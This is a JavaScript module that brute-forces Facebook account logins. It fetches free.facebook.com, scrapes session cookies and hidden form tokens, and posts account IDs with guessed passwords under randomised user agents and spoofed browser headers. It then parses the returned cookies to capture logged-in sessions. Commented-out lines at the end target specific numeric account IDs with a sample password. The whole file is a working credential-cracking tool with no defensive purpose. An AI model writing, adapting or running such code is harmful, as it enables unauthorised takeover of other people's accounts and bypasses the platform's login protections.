import request from "request";
import axios from "axios";
import chalk from "chalk";
import ua from "user-agents";
import util from "util";
import parser from "set-cookie-parser";
import events from "events";
const event = new events.EventEmitter();
event.on("option", (data, e) => {
  request(data, (error, response) => event.emit("response", response, e));
});
export function brute(...arg) {
  event.emit("crack", ...arg, new ua().data.userAgent);
}
event.on("response", prints);
event.on("crack", crack);
function prints(response, pass, num) {
  let cok_parse = parser.parse(response);
  event.emit("account", cok_parse, pass);
}
function crack(num, pass, agent) {
  let req = request.defaults({ _jar: true });
  let opt;
  let cok = [];
  return axios({
    method: "GET",
    url: "https://free.facebook.com",
    timeout: 3600000,
  }).then((free) => {
    free.headers["set-cookie"].forEach((e) => cok.push(e.split(";")[0]));
    let r = req.jar();
    var headers = {
      authority: "free.facebook.com",
      accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "accept-language": "en-US,en;q=0.9",
      "cache-control": "max-age=0",
      "content-type": "application/x-www-form-urlencoded",
      cookie: cok.join("; "),
      origin: "https://free.facebook.com",
      referer: "https://free.facebook.com/",
      "sec-ch-ua":
        '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-platform": '"Android"',
      "sec-fetch-dest": "document",
      "sec-fetch-mode": "navigate",
      "sec-fetch-site": "same-origin",
      "sec-fetch-user": "?1",
      "upgrade-insecure-requests": "1",
      "user-agent": new ua().data.userAgent,
    };

    let dataString = {
      lsd: free.data.match('name="lsd" value="(.*?)"')[1],
      jazoest: free.data.match('name="jazoest" value="(.*?)"')[1],
      m_ts: free.data.match('name="m_ts" value="(.*?)"')[1],
      li: free.data.match('name="li" value="(.*?)"')[1],
      try_number: "0",
      unrecognized_tries: "0",
      email: num,
      pass: pass,
      login: "Log In",
      bi_xrwh: "0",
    };
    var options = {
      url: "https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",
      method: "POST",
      headers: headers,
      body: new URLSearchParams(dataString).toString(),
      jar: r,
    };
    opt = options;
    event.emit("option", options, pass);
  });
}
export { event as event };
/*crack(100083913887034,"Ayomide",new ua().data.userAgent).then(util.promisify(request)).then(prints).then(console.log)*/

//event.emit('crack','100079556149280',"Ayomide",new ua().data.userAgent)
